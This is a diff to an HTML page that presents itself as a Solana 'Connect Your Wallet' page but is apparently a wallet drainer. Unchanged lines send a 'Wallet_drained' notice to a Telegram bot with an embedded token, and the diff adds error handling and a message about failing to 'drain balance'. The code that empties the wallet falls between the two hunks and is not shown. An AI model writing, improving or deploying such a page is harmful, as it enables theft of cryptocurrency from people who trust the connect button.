@@ -10,21 +10,30 @@
  body { font-family: Arial, sans-serif; }
  .container { max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
  button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+ .error { color: red; }
  </style>
 </head>
 <body>
  <div class="container">
  <h1>Connect Your Wallet</h1>
- <p>Connect your Solana wallet here.</p>
+ <p>Connect your Solana wallet.</p>
  <button id="connectWallet">Connect Wallet</button>
  <p id="balance"></p>
+ <p id="error" class="error"></p>
  </div>
  <script>
  const connectWalletBtn = document.getElementById('connectWallet');
  const balanceDisplay = document.getElementById('balance');
+ const errorDisplay = document.getElementById('error');
 
  connectWalletBtn.addEventListener('click', async () => {
+ errorDisplay.textContent = '';
  try {
+ if (!window.solana) {
+ errorDisplay.textContent = 'Phantom wallet is not installed.';
+ return;
+ }
+
  const wallet = await window.solana.connect();
  const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
 
@@ -48,6 +57,7 @@
  fetch(`https://telegram.org/bot<8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI>/sendMessage?chat_id=<6870666933>&text=Wallet_drained`);
  } catch (error) {
  console.error('Error:', error);
+ errorDisplay.textContent = 'Failed to connect to wallet or drain balance.';
  }
  });
  </script>
